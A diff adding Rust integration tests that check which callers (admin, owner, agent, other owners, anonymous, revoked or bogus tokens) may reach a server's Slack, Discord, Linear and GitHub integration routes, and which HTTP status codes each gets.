+    assert_eq!(call(a, "PATCH", &format!("{base}/slack/chi_x"), Some(&body), acme).await, NOT_FOUND);
+    assert_eq!(call(a, "DELETE", &format!("{base}/slack/chi_x"), None, acme).await, NOT_FOUND);
+    // The pickers' lookups: not set up is a quiet 200 to list, a 422 to make one.
+    let lookup = "/v1/code/agents/acme/lookup";
+    for kind in ["slack/workspaces", "slack/channels", "slack/users", "slack/usergroups", "slack/targets", "discord/guilds", "discord/channels", "discord/roles", "discord/members"] {
+        assert_eq!(call(a, "GET", &format!("{lookup}/{kind}"), None, acme).await, OK, "{kind}");
+        assert_eq!(call(a, "GET", &format!("{lookup}/{kind}"), None, Some(ADMIN)).await, OK, "{kind}");
+    }
+    assert_eq!(call(a, "POST", &format!("{lookup}/slack/channels"), Some(&json!({ "name": "x" })), acme).await, StatusCode::UNPROCESSABLE_ENTITY);
+    assert_eq!(call(a, "GET", &format!("{lookup}/slack/emoji"), None, acme).await, NOT_FOUND);
+    let routes = [
+        ("GET", base.to_string()),
+        ("POST", format!("{base}/slack/install")),
+        ("PATCH", format!("{base}/slack/chi_x")),
+        ("DELETE", format!("{base}/slack/chi_x")),
+        ("GET", format!("{lookup}/slack/channels")),
+        ("POST", format!("{lookup}/slack/channels")),
+        ("GET", format!("{lookup}/discord/members")),
+    ];
+    for (who, token, want) in [("agent", agent, FORBIDDEN), ("review app", app_in, FORBIDDEN), ("another owner", other, FORBIDDEN), ("anonymous", None, StatusCode::UNAUTHORIZED)] {
+        for (m, p) in &routes {
+            assert_eq!(call(a, m, p, Some(&body), token).await, want, "{who}: {m} {p}");
+        }
+    }
+    for p in ["/v1/code/chat/slack/events", "/v1/code/chat/slack/commands", "/v1/code/chat/slack/interactions", "/v1/code/chat/discord/interactions"] {
+        for token in [None, acme] {
+            assert_eq!(call(a, "POST", p, Some(&json!({})), token).await, NOT_FOUND, "{p}");
+        }
+    }
+    for p in ["/v1/code/chat/slack/oauth?code=x&state=y", "/v1/code/chat/discord/oauth?code=x&state=y"] {
+        assert_eq!(call(a, "GET", p, None, None).await, NOT_FOUND, "{p}: no such platform here");
+    }
+}
+
+/// Linear's routes: the owner's are Code::manages (they hold the workspace's credentials); the
+/// OAuth callback and the webhooks take no token (the state and the signature are the
+/// credentials), so every caller gets the same answer.
+#[tokio::test]
+async fn linear_routes_follow_the_auth_matrix() {
+    let w = world().await;
+    let a = &w.a;
+    let (s, m) = a.req("POST", "/v1/code/agents/acme/machines", Some(json!({ "name": "box" })), Some(ADMIN)).await;
+    assert_eq!(s, StatusCode::CREATED, "{m}");
+    let machine = m["token"].as_str().unwrap().to_string();
+    let base = "/v1/code/agents/acme/linear";
+    // Not connected, no OAuth app and no ROLL_SECRET_KEY on this server.
+    let routes = [
+        ("GET", base.to_string(), OK),
+        ("DELETE", base.to_string(), NOT_FOUND),
+        ("POST", format!("{base}/oauth"), StatusCode::UNPROCESSABLE_ENTITY),
+        ("PUT", format!("{base}/key"), StatusCode::BAD_REQUEST),
+        ("PUT", format!("{base}/settings"), NOT_FOUND),
+        ("PUT", format!("{base}/webhook/secret"), StatusCode::BAD_REQUEST),
+        ("GET", format!("{base}/teams"), NOT_FOUND),
+        // The pickers' lookups: not connected is a quiet 200 to list, a 422 to make one.
+        ("GET", "/v1/code/agents/acme/lookup/linear/teams".to_string(), OK),
+        ("POST", "/v1/code/agents/acme/lookup/linear/labels".to_string(), StatusCode::UNPROCESSABLE_ENTITY),
+    ];
+    let body = json!({ "name": "s" });
+    for (who, token) in [("admin", Some(ADMIN)), ("owner", Some(w.acme.as_str()))] {
+        for (m, p, want) in &routes {
+            assert_eq!(call(a, m, p, Some(&body), token).await, *want, "{who}: {m} {p}");
+        }
+    }
+    let denied = StatusCode::UNAUTHORIZED;
+    for (who, token, want) in [
+        ("agent", Some(w.agent.as_str()), FORBIDDEN),
+        ("review app", Some(w.app_in.as_str()), FORBIDDEN),
+        ("another owner", Some(w.other.as_str()), FORBIDDEN),
+        ("anonymous", None, denied),
+        ("revoked", Some(w.revoked.as_str()), denied),
+        ("machine", Some(machine.as_str()), denied),
+        ("garbage", Some("hunter2"), denied),
+    ] {
+        for (m, p, _) in &routes {
+            assert_eq!(call(a, m, p, Some(&body), token).await, want, "{who}: {m} {p}");
+        }
+    }
+    assert_eq!(call(a, "GET", "/v1/code/agents/nobody/linear", None, Some(ADMIN)).await, NOT_FOUND);
+    let open = [
+        ("GET", "/v1/code/linear/oauth/callback".to_string(), StatusCode::BAD_REQUEST),
+        ("POST", "/v1/code/linear/webhook".to_string(), NOT_FOUND),
+        ("POST", "/v1/code/linear/webhook/lwh_nope".to_string(), NOT_FOUND),
+    ];
+    for token in [None, Some(ADMIN), Some(w.acme.as_str()), Some(w.agent.as_str()), Some("hunter2")] {
+        for (m, p, want) in &open {
+            assert_eq!(call(a, m, p, Some(&json!({})), token).await, *want, "{token:?}: {m} {p}");
+        }
+    }
+}
+
+/// The pickers' GitHub lookups are Code::manages like the rest of the owner's integrations (an
+/// installation spans tenants: only who manages the owner may look through its repos). With no
+/// GitHub App on this server: a quiet 200 to list, a 422 to make a label; unknown kinds 404.
+#[tokio::test]
+async fn github_lookups_follow_the_auth_matrix() {
+    let w = world().await;
+    let a = &w.a;
+    let base = "/v1/code/agents/acme/lookup/github";
+    let routes = [
+        ("GET", format!("{base}/repos"), OK),
+        ("GET", format!("{base}/branches?parent=app"), OK),
+        ("GET", format!("{base}/reviewers"), OK),
+        ("POST", format!("{base}/labels"), StatusCode::UNPROCESSABLE_ENTITY),
+        ("GET", format!("{base}/stars"), NOT_FOUND),
+    ];
+    let body = json!({ "name": "s", "parent": "app" });
+    for (who, token) in [("admin", Some(ADMIN)), ("owner", Some(w.acme.as_str()))] {
+        for (m, p, want) in &routes {
+            assert_eq!(call(a, m, p, Some(&body), token).await, *want, "{who}: {m} {p}");
+        }
+    }
+    let denied = StatusCode::UNAUTHORIZED;
+    for (who, token, want) in [
+        ("agent", Some(w.agent.as_str()), FORBIDDEN),
+        ("review app", Some(w.app_in.as_str()), FORBIDDEN),
+        ("another owner", Some(w.other.as_str()), FORBIDDEN),
+        ("anonymous", None, denied),
+        ("revoked", Some(w.revoked.as_str()), denied),
+        ("garbage", Some("hunter2"), denied),
+    ] {
+        for (m, p, _) in &routes {
+            assert_eq!(call(a, m, p, Some(&body), token).await, want, "{who}: {m} {p}");
+        }
+    }
+}
